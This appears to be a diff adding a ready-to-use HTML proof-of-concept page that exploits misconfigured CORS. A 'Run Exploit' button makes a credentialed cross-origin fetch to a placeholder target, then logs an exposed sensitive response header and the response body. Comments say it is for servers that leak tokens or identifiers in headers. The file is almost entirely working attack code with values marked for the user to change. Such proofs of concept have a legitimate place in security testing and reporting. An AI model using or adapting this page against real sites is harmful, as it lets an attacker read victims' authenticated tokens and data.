@@ -1,0 +1,33 @@
+<!doctype html>
+<!--
+CORS PoC: Exposed response headers.
+
+Useful when:
+- Server exposes sensitive headers via Access-Control-Expose-Headers
+- Tokens or identifiers appear in response headers
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS Exposed Headers</title>
+</head>
+<body>
+
+<button id="run">Run Exploit</button>
+
+<script>
+  const TARGET_URL = "https://vulnerable-site.example/api/endpoint"; // change
+  const HEADER_NAME = "x-sensitive-header"; // change
+
+  document.getElementById("run").onclick = async () => {
+    const response = await fetch(TARGET_URL, {
+      credentials: "include"
+    });
+
+    console.log("HEADER VALUE:", response.headers.get(HEADER_NAME));
+    console.log("BODY:", await response.text());
+  };
+</script>
+
+</body>
+</html>
